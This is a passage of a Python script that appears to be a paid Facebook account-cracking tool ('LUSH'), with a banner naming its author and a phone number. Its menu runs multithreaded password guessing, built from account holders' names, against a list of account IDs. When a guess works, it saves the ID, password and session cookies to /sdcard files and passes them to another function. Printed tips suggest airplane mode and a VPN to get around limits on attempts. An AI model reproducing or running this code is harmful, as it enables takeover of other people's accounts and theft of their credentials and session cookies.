...
def p(x):
	print(x)
# •/ [ Linked ]
sys.stdout.write('\x1b]2; •[MR.ANMOL  ]•\x07')
# •/ [ Logo ] 
def banner():
    print(f"""   \033[32;1m
...
\033[91;1m╔════════════════════════════════════════╗
{H}║{P}[{H}•{P}] Author    :{warna} ANMOL    BHATTA         {N}{H}║
{H}║{P}[{H}•{P}] Facebook  : {H}ANMOL BHATTA       {N}{H}║
{H}║{P}[{H}•{P}] Whatsapp  : {M}+977 9865936914     {N}{H}║
{H}║{P}[{H}•{P}] Status    : {H}PAID {P}     {N}         {H}     ║
{H}║{P}[{H}•{P}] Version   : {H}1.3                     ║
{H}║{P}[{H}•{P}] Tools     : {H}LUSH                    ║
{M}╚════════════════════════════════════════╝ {P}""")
...
def menu():
                        clear();banner()
                        print('[1] File Cracking ')
                        print('[2] Follow Facebook')
                        print('[3] Join wp group')
                        #print('[4] Telegram')
                    #    print('[5] Follow Facebook')
                        print('[0] Exit Programm ')
                        linex()
                        xd=input('[•] Choice an option : ')
                        if xd in ['1','01']:
                                clear();banner()
                                print('[•] Put File Exp : /sdcard/File.txt...')
                                linex()
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print(' TOTAL ACCOUNT : '+total_ids+f' ')
                                        print(f"\rSPEED BOOST ON/OFF AIRPLANE MODE 🚀 ")
                                        print(f"\rIF U ARE USING WIFI TRY WITH 1.1.1.1 VPN & AIRPLANE MODE ")
...
def M1(ids,names,passlist):
                try:
                        global loop, ok, cp
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mANMOL  -M1\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;37m[\033[1;32mANMOL  -OK]\033[1;37m \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print(f'\r[🍪]{warna}'+cookie);print(led)
                                        open('/sdcard/ANMOL  _OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ANMOL  _COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        ...
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[ANMOL  -CP]> '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ANMOL  -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/ANMOL  -CP.txt','a').write(ids+'|'+pas+'\n')
...
def M2(ids,names,passlist):
                try:
                        global loop, ok, cp
                        animasi = random.choice(["\x1b[1;91mANMOL  ","\x1b[1;92mANMOL  ","\x1b[1;93mANMOL  ","\x1b[1;94mANMOL  ","\x1b[1;95mANMOL  ","\x1b[1;96mANMOL  ","\x1b[1;97mANMOL  ","\x1b[1;91mANMOL  ","\x1b[1;92mANMOL  ","\x1b[1;93mANMOL  ","\x1b[1;94mANMOL  ","\x1b[1;95mANMOL  ","\x1b[1;96mANMOL  "])
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mANMOL  -M2\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
                                        print('\r\r\033[1;37m[\033[1;32mANMOL  -OK]\033[1;37m \033[1;32m'+ids+' \033[1;37m| \033[1;32m'+pas+'\033[1;97m')
                                        print(" {warna}[🍪] : {warna}"+cookie);print(led)
                                        open('/sdcard/ANMOL  _OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/ANMOL  _COOKIES.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                        Elite(ids,pas,cookie)
                                        oks.append(ids)
                                        Elite(ids,pas,ckkk)
...
def M3(ids,names,passlist):
                try:
                        global loop, ok, cp
                        animasi = random.choice(["\x1b[1;91mANMOL  ","\x1b[1;92mANMOL  ","\x1b[1;93mANMOL  ","\x1b[1;94mANMOL  ","\x1b[1;95mANMOL  ","\x1b[1;96mANMOL  ","\x1b[1;97mANMOL  ","\x1b[1;91mANMOL  ","\x1b[1;92mANMOL  ","\x1b[1;93mANMOL  ","\x1b[1;94mANMOL  ","\x1b[1;95mANMOL  ","\x1b[1;96mANMOL  "])
                        sys.stdout.write('\r\r\033[1;32m[\033[1;37mANMOL  -M3\033[1;32m]\033[1;36m(%s)\033[1;33m+\033[1;39mOK(%s)\033[1;39m \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
